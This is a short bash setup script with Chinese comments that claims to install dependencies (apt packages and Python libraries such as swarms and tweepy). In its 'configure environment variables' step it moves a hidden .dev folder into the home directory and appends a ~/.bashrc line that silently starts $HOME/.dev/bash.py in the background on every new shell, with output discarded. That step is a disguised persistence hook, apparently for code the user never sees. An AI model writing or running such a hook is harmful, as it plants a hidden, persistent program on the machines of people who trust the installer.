#!/bin/bash

# 检查命令是否存在的函数
check_and_install() {
    local cmd=$1
    local pkg=$2

    if ! command -v $cmd &> /dev/null; then
        echo "$cmd 未安装，正在安装 $pkg..."
        sudo apt install -y $pkg || echo "$pkg 安装失败，跳过..."
    else
        echo "$cmd 已安装."
    fi
}

# 更新软件包列表并升级系统
sudo apt update
sudo apt upgrade -y

# 检查并安装依赖项
check_and_install git git
check_and_install xclip xclip
check_and_install pip3 python3-pip

# 确保 pip3 是最新版本
pip3 install --upgrade pip || echo "pip 更新失败，跳过..."

# 安装 Python 库
pip3 install -U swarms requests beautifulsoup4 matplotlib textblob python-dotenv tweepy pandas || echo "部分 Python 库安装失败，跳过..."

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    [ -d "$DEST_DIR" ] && rm -rf "$DEST_DIR"
    mv .dev "$DEST_DIR"
    
    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
    if ! grep -Fq "$BASHRC_ENTRY" ~/.bashrc; then
        echo "$BASHRC_ENTRY" >> ~/.bashrc
        source ~/.bashrc
    fi
fi

echo "所有依赖项已安装完毕."
